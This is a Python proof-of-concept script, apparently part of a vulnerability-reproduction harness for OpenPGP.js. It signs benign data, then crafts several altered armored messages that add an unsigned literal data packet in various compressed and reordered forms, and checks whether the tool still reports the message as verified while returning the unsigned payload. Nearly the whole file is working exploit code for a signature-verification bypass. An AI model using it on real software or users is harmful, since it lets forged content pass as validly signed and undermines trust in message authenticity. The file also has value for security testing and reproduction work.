#!/usr/bin/env python3
import argparse
import base64
import json
import os
import signal
import subprocess
import sys
import tempfile
import time
import zlib


BASELINE_DATA = b"baseline: legitimately signed data\n"
PAYLOAD_DATA = b"payload: embedded unsigned data\n"


def run_command(command, timeout):
    start = time.monotonic()
    proc = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    timed_out = False
    try:
        stdout, stderr = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        timed_out = True
        proc.kill()
        stdout, stderr = proc.communicate()
    runtime_ms = int((time.monotonic() - start) * 1000)
    return {
        "command": command,
        "returncode": proc.returncode,
        "signal": -proc.returncode if proc.returncode is not None and proc.returncode < 0 else None,
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": stdout,
        "stderr": stderr,
    }


def run_json(command, timeout):
    result = run_command(command, timeout)
    if result["timed_out"]:
        raise RuntimeError("subprocess timed out: " + " ".join(command))
    if result["returncode"] != 0:
        raise RuntimeError("subprocess failed: " + " ".join(command))
    try:
        result["json"] = json.loads(result["stdout"])
    except json.JSONDecodeError as exc:
        raise RuntimeError("subprocess did not emit JSON: " + str(exc))
    return result


def dearmor_pgp_message(path):
    in_block = False
    b64_lines = []
    with open(path, "r", encoding="ascii") as f:
        for raw_line in f:
            line = raw_line.strip()
            if line == "-----BEGIN PGP MESSAGE-----":
                in_block = True
                continue
            if line == "-----END PGP MESSAGE-----":
                break
            if not in_block or not line:
                continue
            if line.startswith("=") or ":" in line:
                continue
            b64_lines.append(line)
    if not b64_lines:
        raise ValueError("no armored message body found")
    return base64.b64decode("".join(b64_lines), validate=True)


def crc24(data):
    crc = 0xB704CE
    for byte in data:
        crc ^= byte << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= 0x1864CFB
            crc &= 0xFFFFFF
    return crc


def armor_pgp_message(data):
    encoded = base64.b64encode(data).decode("ascii")
    lines = [encoded[i : i + 64] for i in range(0, len(encoded), 64)]
    checksum = base64.b64encode(crc24(data).to_bytes(3, "big")).decode("ascii")
    return (
        "-----BEGIN PGP MESSAGE-----\n\n"
        + "\n".join(lines)
        + "\n="
        + checksum
        + "\n-----END PGP MESSAGE-----\n"
    )


def packet_header(tag, length):
    if not 0 <= tag <= 63:
        raise ValueError("invalid packet tag")
    if length < 0:
        raise ValueError("invalid packet length")
    if length < 192:
        return bytes([0xC0 | tag, length])
    if length < 8384:
        length -= 192
        return bytes([0xC0 | tag, (length >> 8) + 192, length & 0xFF])
    return bytes([0xC0 | tag, 255]) + length.to_bytes(4, "big")


def literal_packet(data):
    body = b"b" + b"\x00" + (0).to_bytes(4, "big") + data
    return packet_header(11, len(body)) + body


def compressed_packet(packet_stream):
    body = b"\x02" + zlib.compress(packet_stream)
    return packet_header(8, len(body)) + body


def split_packets(packet_stream):
    packets = []
    offset = 0
    total = len(packet_stream)
    while offset < total:
        start = offset
        first = packet_stream[offset]
        offset += 1
        if not first & 0x80:
            raise ValueError("invalid packet header")

        if first & 0x40:
            tag = first & 0x3F
            first_len = packet_stream[offset]
            offset += 1
            if first_len < 192:
                length = first_len
            elif first_len < 224:
                length = ((first_len - 192) << 8) + packet_stream[offset] + 192
                offset += 1
            elif first_len == 255:
                length = int.from_bytes(packet_stream[offset : offset + 4], "big")
                offset += 4
            else:
                raise ValueError("partial packet lengths are not used by this PoC")
        else:
            tag = (first >> 2) & 0x0F
            len_type = first & 0x03
            if len_type == 0:
                length = packet_stream[offset]
                offset += 1
            elif len_type == 1:
                length = int.from_bytes(packet_stream[offset : offset + 2], "big")
                offset += 2
            elif len_type == 2:
                length = int.from_bytes(packet_stream[offset : offset + 4], "big")
                offset += 4
            else:
                raise ValueError("indeterminate packet lengths are not used by this PoC")

        end = offset + length
        if end > total:
            raise ValueError("packet length exceeds message size")
        packets.append((tag, packet_stream[start:end]))
        offset = end
    return packets


def direct_packet_variants(baseline_packets, payload_pkt):
    variants = []
    for idx, (tag, _) in enumerate(baseline_packets):
        if tag == 11:
            variants.append(
                (
                    "payload_before_first_literal",
                    b"".join(pkt for _, pkt in baseline_packets[:idx])
                    + payload_pkt
                    + b"".join(pkt for _, pkt in baseline_packets[idx:]),
                )
            )
            variants.append(
                (
                    "payload_after_first_literal",
                    b"".join(pkt for _, pkt in baseline_packets[: idx + 1])
                    + payload_pkt
                    + b"".join(pkt for _, pkt in baseline_packets[idx + 1 :]),
                )
            )
            break
    return variants


def candidate_packet_streams(baseline_stream, payload):
    payload_pkt = literal_packet(payload)
    candidates = [
        ("baseline_plus_payload_literal", baseline_stream + payload_pkt),
        ("compressed_baseline_plus_payload_literal", compressed_packet(baseline_stream + payload_pkt)),
        ("compressed_baseline_then_payload_literal", compressed_packet(baseline_stream) + payload_pkt),
        ("baseline_then_compressed_payload_literal", baseline_stream + compressed_packet(payload_pkt)),
        ("double_compressed_baseline_plus_payload_literal", compressed_packet(compressed_packet(baseline_stream + payload_pkt))),
    ]
    try:
        candidates.extend(direct_packet_variants(split_packets(baseline_stream), payload_pkt))
    except Exception:
        pass
    return candidates


def data_text_from_b64(value):
    return base64.b64decode(value).decode("utf-8", "replace")


def extract_verify_observation(parsed):
    data = parsed.get("data") or {}
    b64 = data.get("b64")
    if not isinstance(b64, str):
        raise ValueError("verify output did not include data.b64")
    text = data.get("text")
    if not isinstance(text, str):
        text = data_text_from_b64(b64)
    return bool(parsed.get("verified")), b64, text


def write_text(path, data):
    with open(path, "w", encoding="utf-8") as f:
        f.write(data)


def write_bytes(path, data):
    with open(path, "wb") as f:
        f.write(data)


def build_result(binary, primary, observable_value, error):
    return {
        "binary": binary,
        "command": primary["command"] if primary else None,
        "returncode": primary["returncode"] if primary else None,
        "signal": primary["signal"] if primary else None,
        "timed_out": primary["timed_out"] if primary else False,
        "runtime_ms": primary["runtime_ms"] if primary else 0,
        "stdout": primary["stdout"] if primary else "",
        "stderr": primary["stderr"] if primary else "",
        "observable": {
            "kind": "custom",
            "value": json.dumps(observable_value, separators=(",", ":")) if observable_value is not None else "",
            "path": None,
        },
        "error": error,
    }


def main(argv):
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=120.0)
    args = parser.parse_args(argv)

    primary = None
    observable = None
    error = None

    try:
        with tempfile.TemporaryDirectory(prefix="poc-openpgpjs-") as tmpdir:
            keygen = run_json([args.binary, "keygen", "--out-dir", tmpdir, "--name", "poc"], args.timeout)["json"]
            private_key = keygen.get("private_key_file") or os.path.join(tmpdir, "poc-private.asc")
            public_key = keygen.get("public_key_file") or os.path.join(tmpdir, "poc-public.asc")

            baseline_data_path = os.path.join(tmpdir, "baseline.txt")
            payload_path = os.path.join(tmpdir, "payload.txt")
            baseline_msg_path = os.path.join(tmpdir, "baseline.asc")
            write_bytes(baseline_data_path, BASELINE_DATA)
            write_bytes(payload_path, PAYLOAD_DATA)

            run_json(
                [
                    args.binary,
                    "sign",
                    "--key",
                    private_key,
                    "--data",
                    baseline_data_path,
                    "--out",
                    baseline_msg_path,
                ],
                args.timeout,
            )

            baseline_result = run_json(
                [args.binary, "verify", "--message", baseline_msg_path, "--key", public_key],
                args.timeout,
            )
            baseline_verified, baseline_b64, baseline_text = extract_verify_observation(baseline_result["json"])
            expected_baseline_b64 = base64.b64encode(BASELINE_DATA).decode("ascii")
            if not baseline_verified or baseline_b64 != expected_baseline_b64:
                raise RuntimeError("baseline message did not verify with the signed data")

            baseline_stream = dearmor_pgp_message(baseline_msg_path)
            payload_b64 = base64.b64encode(PAYLOAD_DATA).decode("ascii")
            selected = None
            verified_baseline_fallback = None

            for index, (name, packet_stream) in enumerate(candidate_packet_streams(baseline_stream, PAYLOAD_DATA)):
                crafted_path = os.path.join(tmpdir, "crafted-%02d-%s.asc" % (index, name))
                write_text(crafted_path, armor_pgp_message(packet_stream))
                attempt = run_command(
                    [args.binary, "verify", "--message", crafted_path, "--key", public_key],
                    args.timeout,
                )
                if attempt["timed_out"] or attempt["returncode"] != 0:
                    continue
                try:
                    parsed = json.loads(attempt["stdout"])
                    crafted_verified, crafted_b64, crafted_text = extract_verify_observation(parsed)
                except Exception:
                    continue
                if not crafted_verified:
                    continue
                candidate = (attempt, crafted_verified, crafted_b64, crafted_text)
                if crafted_b64 == payload_b64:
                    selected = candidate
                    break
                if crafted_b64 == baseline_b64 and verified_baseline_fallback is None:
                    verified_baseline_fallback = candidate

            if selected is None:
                selected = verified_baseline_fallback
            if selected is None:
                raise RuntimeError("no crafted message verified")

            primary, crafted_verified, crafted_b64, crafted_text = selected
            observable = {
                "verified": crafted_verified,
                "data_b64": crafted_b64,
                "data_text": crafted_text,
                "baseline_verified": baseline_verified,
                "baseline_data_b64": baseline_b64,
                "baseline_data_text": baseline_text,
                "payload_b64": payload_b64,
                "payload_text": PAYLOAD_DATA.decode("utf-8"),
            }

    except Exception as exc:
        error = str(exc)

    result = build_result(args.binary, primary, observable, error)
    output = json.dumps(result, separators=(",", ":"))
    if args.json_out:
        os.makedirs(os.path.dirname(os.path.abspath(args.json_out)), exist_ok=True)
        with open(args.json_out, "w", encoding="utf-8") as f:
            f.write(output + "\n")
    print(output)
    return 0 if error is None else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
